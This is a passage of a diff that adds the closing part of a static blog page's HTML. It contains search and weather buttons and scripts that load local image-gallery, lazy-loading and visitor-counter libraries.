+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a role="button" id="searchbutton" class="basebutton searchwidget" aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a>
+
+  
+  
+  
+  <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img');
+    var i;
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a');
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'));
+      wrapper.setAttribute('aria-label', 'illustration');
+      wrapper.style.cssText = 'width: 100%; display: flex; justify-content: center;';
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt;
+      wrapper.dataset.nolink = true;
+      img[i].before(wrapper);
+      wrapper.append(img[i]);
+      var divWrap = document.createElement('div');
+      divWrap.classList.add('gallery');
+      wrapper.before(divWrap);
+      divWrap.append(wrapper);
+    }
+    baguetteBox.run('.gallery');
+  }
+</script>
+<script>loadScript("/js/lib/lightbox/baguetteBox.min.js", addImgLayout)</script>
+  
+  
+  
+<script src="/js/main.js"></script>
+
+  
+  <script>loadScript("/js/lib/busuanzi.min.js")</script>
+  
+  
+  <script>
+    var addLazyload = function () {
+      var observer = lozad('.lozad', {
+        load: function (el) {
+          el.srcset = el.getAttribute('data-src');
+        },
+        loaded: function (el) {
+          el.classList.add('loaded');
+        }
+      });
+      observer.observe();
+    }
+  </script>
+  <script>loadScript("/js/lib/lozad.min.js", addLazyload)</script>
+  
+  
+</body>
+
+</html>
